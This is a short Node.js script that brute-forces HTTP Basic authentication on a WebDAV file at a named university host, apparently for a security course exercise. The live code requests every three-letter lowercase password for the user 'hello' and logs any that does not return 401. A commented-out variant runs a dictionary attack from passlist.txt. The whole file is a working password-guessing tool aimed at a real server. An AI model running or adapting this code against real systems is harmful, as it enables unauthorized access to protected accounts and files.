const fs = require('fs');
const request = require('request');
const username = 'hello';
let passwords = []
let statusCode;


(function bruteForce() {
  for (let firstChar = 97; firstChar < 123; firstChar++) {
    for (let secondChar = 97; secondChar < 123; secondChar++) {
      for (let thirdChar = 97; thirdChar < 123; thirdChar++) {
        let password = String.fromCharCode(firstChar, secondChar, thirdChar);
        const url = 'http://' + username + ':' + password + '@pauline.informatik.tu-chemnitz.de/webdav_http_basic/secret.jpg';

        request({url}, (err, res, body) => {
          statusCode = res.statusCode;
          if (statusCode != 401) {
            console.log("success: ", password);
            return;
          }
        });
      }
    }
  }
  
})()


// fs.readFile('passlist.txt', 'utf8', (err, content) => {
//   if (err) throw err;
//   passwords = content.split('\r\n');
//   dictionaryAttack();
// });

// function dictionaryAttack() {
//   let i = 0;
//   while (i < passwords.length) {
//     let password = passwords[i++];
//     const url = 'http://' + username + ':' + password + '@pauline.informatik.tu-chemnitz.de/webdav_http_basic/secret.jpg';

//     request({url}, (err, res, body) => {
//       statusCode = res.statusCode;
//       if (statusCode != 401) {
//         console.log("success: ", password);
//         return;
//       }
//     });
//   }
// }
